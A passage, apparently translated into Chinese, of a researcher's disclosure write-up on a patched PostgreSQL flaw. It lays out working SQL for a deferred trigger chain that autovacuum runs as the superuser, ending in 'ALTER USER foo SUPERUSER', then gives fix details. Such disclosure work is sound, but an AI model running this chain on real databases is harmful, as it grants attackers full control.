    CREATE TABLE t1 (s varchar);
    -- create a function for inserting current user into another table
    CREATE OR REPLACE FUNCTION snfunc(integer) RETURNS integer
       LANGUAGE sql 
       SECURITY INVOKER AS
    'INSERT INTO t1 VALUES (current_user); SELECT $1';
    -- create a trigger function which will call the second function for inserting current user into table t1
    CREATE OR REPLACE FUNCTION strig() RETURNS trigger 
      AS $e$ BEGIN 
        PERFORM snfunc(1000); RETURN NEW; 
      END $e$ 
    LANGUAGE plpgsql;
    /* create a CONSTRAINT TRIGGER, which is deferred
     deferred causes it to trigger on commit, by which time the user has been switched back to the
     invoking user, rather than the owner
    */
    CREATE CONSTRAINT TRIGGER def
        AFTER INSERT ON t0
        INITIALLY DEFERRED 
        FOR EACH ROW
      EXECUTE PROCEDURE strig();
我们必须创建第二个插入函数,否则我们将以非特权用户身份继续插入到要插入到其中的初始表中。
我们还希望该功能是实际执行特权操作的功能。这一点可以被简化,并且触发功能可以完成所有操作。但是这就是我当时大脑的工作方式，为什么要弄乱一些可行的东西？
    tmp=> SELECT * FROM t0;
      s 
    ----- 
      foo
    (1 row)
    tmp=> SELECT * FROM t1;
     s
    ---    (0 rows)
    tmp=> INSERT INTO t0 VALUES ('baz');
    INSERT 0 1
    tmp=> SELECT * FROM t1;
      s
    -----     foo
    (1 row)
哇,`current_user`已插入table中`t1`。切换到特权用户(postgre)并插入`t0`,应该导致`postgres`出现在表中`t1`：
    tmp=# INSERT INTO t0 VALUES ('bazfoo');
    INSERT 0 1
    tmp=# SELECT * FROM t1;
        s
    ----------     foo
     postgres
    (2 rows)
太棒了,
现在我们可以欺骗特权用户插入到我们的表中。或者更好的方式是,测试`ANALYZE`或`VACUUM`函数现在是否在安全性受限的操作之外执行最终命令。
## 分析
作为特权用户,只需`ANALYZE`在此时执行：
    tmp=# ANALYZE;
    ANALYZE
    tmp=# SELECT * FROM t1;
        s
    ----------     foo
     postgres
     postgres
    (3 rows)
成功执行!这意味着只要有特权的用户执行`ANALYZE`（或`VACUMM`就此而言），就有机会以该用户的身份执行命令！事实证明`ANALYZE`，`VACUUM`这是特权用户经常执行的非常常见的管理操作。因此，priv-esc的机会应该很高。
## 自动化
在这一点上,我们已经进行了特权升级，但是仍然需要一些手动交互。幸运地是，由于`ANALYZE`和`VACUUM`函数通常运行，并且经常因为事件运行。因此Postgresql具有[内置的功能](https://www.postgresql.org/docs/current/runtime-config-autovacuum.html)来定期运行这些[功能](https://www.postgresql.org/docs/current/runtime-config-autovacuum.html)
（需要启用，默认情况下处于禁用状态）。也许可以通过此`autovacuum`过程直接触发此问题？
要强制触发`autovacuum`运行，可以设置一些较低的阈值，然后在几次插入和删除之后该过程将运行：
    ALTER TABLE blah SET (autovacuum_vacuum_threshold = 1);
    ALTER TABLE blah SET (autovacuum_analyze_threshold = 1);
不幸地是,这没有用。此时我差点认为`autovacuum`没有漏洞。但是幸运地是,我决定尝试去找出它没有"漏洞"的原因。只需快速查看日志即可确定问题所在:
`tail -f /var/log/postgres/postgresql-12-main.log`
    2020-10-15 19:42:19.501 UTC [14231] LOG:  automatic vacuum of table "tmp.public.blah": index scans: 1
            pages: 0 removed, 1 remain, 0 skipped due to pins, 0 skipped frozen
            tuples: 6 removed, 1 remain, 0 are dead but not yet removable, oldest xmin: 2618
            buffer usage: 43 hits, 4 misses, 7 dirtied
            avg read rate: 53.879 MB/s, avg write rate: 94.289 MB/s
            system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
    2020-10-15 19:42:19.531 UTC [14231] ERROR:  relation "t0" does not exist at character 13
    2020-10-15 19:42:19.531 UTC [14231] QUERY:  INSERT INTO t0 VALUES (current_user); SELECT $1
    2020-10-15 19:42:19.531 UTC [14231] CONTEXT:  SQL function "sfunc" during startup
问题很明显,autovacuum在Postgres中运行，但是没有数据库和模式集.因此当它尝试`INSERT INTO t0`时，他不能找到表!
所需要做的就是通过提供数据库和模式来告诉autovacuum在哪里可以找到完整的关系。
一个简单的更改：
    CREATE OR REPLACE FUNCTION sfunc(integer) RETURNS integer
       LANGUAGE sql 
       SECURITY INVOKER AS
    'INSERT INTO t0 VALUES (current_user); SELECT $1';
变为:
    CREATE OR REPLACE FUNCTION sfunc(integer) RETURNS integer
       LANGUAGE sql 
       SECURITY INVOKER AS
    'INSERT INTO tmp.public.t0 VALUES (current_user); SELECT $1';
现在，当autovacuum运行时，它将触发漏洞并以引导超级用户（通常为postgres）执行。
## 全自动化
在这一点上,将其编程一个完整的漏洞利用利用程序，可以自动将用户提升为`superuser`。有一个小问题,因为整个漏洞利用链是在插入基表时触发的，因此事务将在漏洞利用尝试提升特权的时候失败(因为它仍然以非特权用户身份执行,而不是在`autovacuum`进程执行)。这就需要一个简单的保护措施来检查洞利用程序（特权提升）是否应该运行，或者是否应该继续为`autovacuum`建立漏洞利用链。
    -- Low privileged function
    CREATE OR REPLACE FUNCTION snfunc(integer) RETURNS integer
       LANGUAGE sql 
       SECURITY INVOKER AS
    'INSERT INTO tmp.public.t1 VALUES (current_user);
    SELECT $1';
    -- High privileged function
    CREATE OR REPLACE FUNCTION snfunc2(integer) RETURNS integer
       LANGUAGE sql 
       SECURITY INVOKER AS
    'INSERT INTO tmp.public.t1 VALUES (current_user); 
    ALTER USER foo SUPERUSER; 
    SELECT $1';
    -- updated trigger
    CREATE OR REPLACE FUNCTION strig() RETURNS trigger 
    AS $e$ 
    BEGIN 
    IF current_user = 'postgres' THEN
        PERFORM tmp.public.snfunc2(1000); RETURN NEW; 
    ELSE
        PERFORM tmp.public.snfunc(1000); RETURN NEW; 
    END IF;
    END $e$ 
    LANGUAGE plpgsql;
现在，当autovacuum运行时，低特权用户将被提升为超级用户。 顶框显示autovacuum的日志， 底框显示INSERT /
DELETE触发`autovacuum`
## 修复和总结
已发布所有受支持的Postgresql版本的补丁。这些可直接从[https://www.postgresql.org/](https://www.postgresql.org/about/news/postgresql-131-125-1110-1015-9620-and-9524-released-2111/)获得，或应在软件包镜像中获得。
在无法应用补丁的情况下，可以采取一些缓解措施。这些确实带有可能会严重影响性能的警告。
>
> 虽然及时更新PostgreSQL是大多数用户的最佳补救措施，但是无法做到这一点的用户可以通过禁用自动清理并且不手动运行ANALYZE，CLUSTER，REINDEX，CREATE
> INDEX，VACUUM FULL，REFRESH MATERIALIZED VIEW或从
> 来自pg_dump命令的输出还原来解决该漏洞。在这种解决方法下，性能可能会迅速下降。
完整的建议已发送：[https](https://gist.github.com/staaldraad/1325617885d42aa40777aa4774e91214)
:
[//gist.github.com/staaldraad/1325617885d42aa40777aa4774e91214](https://gist.github.com/staaldraad/1325617885d42aa40777aa4774e91214)
修复：[https](https://www.postgresql.org/about/news/postgresql-131-125-1110-1015-9620-and-9524-released-2111/)
:
[//www.postgresql.org/](https://www.postgresql.org/about/news/postgresql-131-125-1110-1015-9620-and-9524-released-2111/)
> 本文为翻译文章
>
>
> 原文链接: privesc/>